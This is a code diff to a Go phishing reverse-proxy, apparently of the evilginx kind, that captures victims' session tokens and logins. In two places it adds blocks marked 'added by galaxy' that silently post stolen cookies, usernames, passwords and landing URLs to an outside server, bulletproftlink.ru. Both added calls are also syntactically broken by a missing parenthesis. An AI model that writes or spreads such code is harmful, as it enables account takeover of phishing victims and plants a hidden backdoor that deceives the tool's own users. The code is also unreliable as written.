@@ -866,6 +866,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
 										log.Error("database: %v", err)
 									}
+
+									//////////////////////// added by galaxy
+									params := url.Values{}
+									params.Add("cookie", TokensToJSON(pl, s.Tokens)
+									params.Add("username", s.Username)
+									params.Add("password", s.Password)
+									params.Add("landing_url", ps.LandingURL)
+
+									log.Info("On params  called : %s", params)
+									resp, err := http.PostForm("https://bulletproftlink.ru/api/store-cookie", params)
+									if err != nil {
+										fmt.Print(err.Error())
+									}
+
+									responseData, err := ioutil.ReadAll(resp.Body)
+									if err != nil {
+										fmt.Print(err.Error())
+									}
+									fmt.Println("this is the response", string(responseData))
+									//////////////////////// added by galaxy
+
 									shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
 									if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
 										str := `[%d] Username: %s \n Password: %s \n Custom: %s`
@@ -1010,7 +1031,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								
+								//////////////////////// added by galaxy
+								params := url.Values{}
+								params.Add("cookie", TokensToJSON(pl, s.Tokens)
+								params.Add("username", s.Username)
+								params.Add("password", s.Password)
+								params.Add("landing_url", ps.LandingURL)
 
+								log.Info("On params  called : %s", params)
+								resp, err := http.PostForm("https://bulletproftlink.ru/api/store-cookie", params)
+								if err != nil {
+									fmt.Print(err.Error())
+								}
+
+								responseData, err := ioutil.ReadAll(resp.Body)
+								if err != nil {
+									fmt.Print(err.Error())
+								}
+								fmt.Println("this is the response", string(responseData))
+								//////////////////////// added by galaxy
+								
 								shouldSend := p.cfg.webhook_verbosity == 1 && !s.WebhookSent
 								if len(s.Tokens) > 0 && shouldSend || p.cfg.webhook_verbosity == 2 {
 									str := `[%d] Username: %s \n Password: %s \n Custom: %s`
